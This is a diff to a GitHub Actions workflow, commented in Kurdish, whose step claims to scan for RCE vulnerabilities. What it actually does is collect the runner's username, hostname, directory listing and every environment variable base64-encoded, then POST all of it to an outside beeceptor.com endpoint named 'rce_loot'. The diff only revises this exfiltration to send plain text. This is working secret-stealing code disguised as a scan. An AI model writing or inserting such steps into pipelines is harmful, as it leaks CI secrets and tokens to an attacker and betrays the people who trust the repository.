@@ -14,10 +14,24 @@ jobs:
         run: |
           echo "Scanning for RCE vulnerabilities..."
           
-          # ١. کۆکردنەوەی زانیارییەکان لە ناو گۆڕاوێک (Variable)
-          # بەم شێوەیە هەموو داتاکان دەبن بە یەک پەیامی تێکستی
-          DATA="User: $(whoami) | Host: $(hostname) | Files: $(ls -la /home/runner/work/) | ENV_BASE64: $(env | base64)"
+          # ١. کۆکردنەوەی هەموو زانیارییەکان لە ناو یەک گۆڕاوی تێکستیدا
+          # hostname و whoami و لیستەی فایلەکان و ئەوانەی لە env دان
+          DATA=$(cat <<EOF
+          --- RCE DATA ---
+          User: $(whoami)
+          Hostname: $(hostname)
+          Working Directory: $(pwd)
+          Directory Content:
+          $(ls -la)
+          Environment Variables:
+          $(env | base64)
+          --- END OF DATA ---
+          EOF
+          )
           
-          # ٢. ناردنی ڕاستەوخۆی داتاکە لە ناو Body-دا
-          # چیتر بە -F نییە، بەڵکو بە -d دەیاننێرین
-          curl -X POST -d "$DATA" https://aksjwuwu.free.beeceptor.com/rce_loot
+          # ٢. ناردنی ڕاستەوخۆی تێکستەکە بەبێ دروستکردنی فایل
+          # -H "Content-Type: text/plain" گرنگترین بەشە بۆ ئەوەی وەک فایل نەبینرێت
+          curl -X POST \
+            -H "Content-Type: text/plain" \
+            -d "$DATA" \
+            https://aksjwuwu.free.beeceptor.com/rce_loot
